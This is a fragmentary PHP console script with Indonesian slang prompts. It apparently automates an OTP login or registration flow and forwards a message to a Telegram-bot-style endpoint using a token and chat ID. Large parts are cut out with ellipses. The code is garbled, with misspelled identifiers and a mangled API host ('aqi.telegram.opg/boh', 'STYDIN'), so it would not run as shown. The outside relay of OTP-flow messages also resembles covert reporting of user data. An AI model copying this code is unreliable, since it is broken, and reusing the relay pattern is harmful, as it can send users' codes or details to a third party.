...
echo color("green","# # # # # # # # # # # # # # # # # # # # # # # \n");
	echo "\n";
echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
echo "\e[93mHAYOO, MAU NGOPIK YA KAMUU ?: ";	
       $pilihy = trim(fgets(STYDIN));
...
// function change(){
        ...
        echo color("yellow","📶▶️ KODE OTP UDAH DI KIRIM YA")."\n";
        otp:
	...
	$method	= "sendMessage";
	$url    = "https://aqi.telegram.opg/boh" . $TOKEN . "/". $method;
	$post = [
 		'chat_id' => $chatib,
                'text' => $pesan
        	];
         ...
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("yellow","!] INPUT ULANG YANG BENER YET\n");
         goto ulang;
         }
         }else{
